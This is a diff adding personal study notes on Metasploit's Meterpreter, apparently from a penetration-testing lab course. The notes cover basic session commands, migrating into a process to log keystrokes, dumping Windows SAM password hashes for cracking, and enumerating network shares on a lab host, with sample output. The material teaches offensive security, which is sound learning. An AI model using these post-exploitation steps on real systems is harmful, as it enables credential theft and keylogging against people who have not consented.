@@ -454,6 +454,73 @@ Network connection types you can have with the target system (Do they allow raw 
 Can you only have an HTTPS reverse connection? Are IPv6 addresses not as closely monitored as IPv4 addresses? etc.)
 
 ---
+
+Useful:
+```
+help 
+getuid (which user)
+ps (shows all processes)
+search
+shell (crtl+z - leaving session without closing)
+```
+
+```
+Migrate
+
+Migrating to another process will help Meterpreter interact with it. For example, if you see a word processor
+running on the target (e.g. word.exe, notepad.exe, etc.), you can migrate to it and start capturing keystrokes
+ sent by the user to this process. Some Meterpreter versions will offer you the keyscan_start, keyscan_stop,
+and keyscan_dump command options to make Meterpreter act like a keylogger. Migrating to another process may also
+ help you to have a more stable Meterpreter session.
+
+To migrate to any process, you need to type the migrate command followed by the PID of the desired target process.
+The example below shows Meterpreter migrating to process ID 716.
+
+The migrate command
+meterpreter > migrate 716
+[*] Migrating from 1304 to 716...
+[*] Migration completed successfully.
+meterpreter >
+```
+- Get the hashes from SAM Database (Windows)  
+- can be used for hash-attacks
+- Rainbow tables for NTLM for cracking (brutefore not possible its hash)
+```
+hashdump
+
+meterpreter > hashdump
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
+meterpreter >
+
+```
+
+```
+ctrl +z the session and use >>> modul to gather network shares for the user
+
+msf6 post(windows/gather/enum_shares) > set session 2
+session => 2
+msf6 post(windows/gather/enum_shares) > run
+[*] Running module against ACME-TEST (10.67.142.181)
+[*] The following shares were found:
+[*] 	Name: SYSVOL
+[*] 	Path: C:\Windows\SYSVOL\sysvol
+[*] 	Remark: Logon server share 
+[*] 	Type: DISK
+[*] 
+[*] 	Name: NETLOGON
+[*] 	Path: C:\Windows\SYSVOL\sysvol\FLASH.local\SCRIPTS
+[*] 	Remark: Logon server share 
+[*] 	Type: DISK
+[*] 
+[*] 	Name: speedster
+[*] 	Path: C:\Shares\speedster
+[*] 	Type: DISK
+[*] 
+[*] Post module execution completed
+
+```
 List of Commands (help):  
 background: Backgrounds the current session  
 exit: Terminate the Meterpreter session  
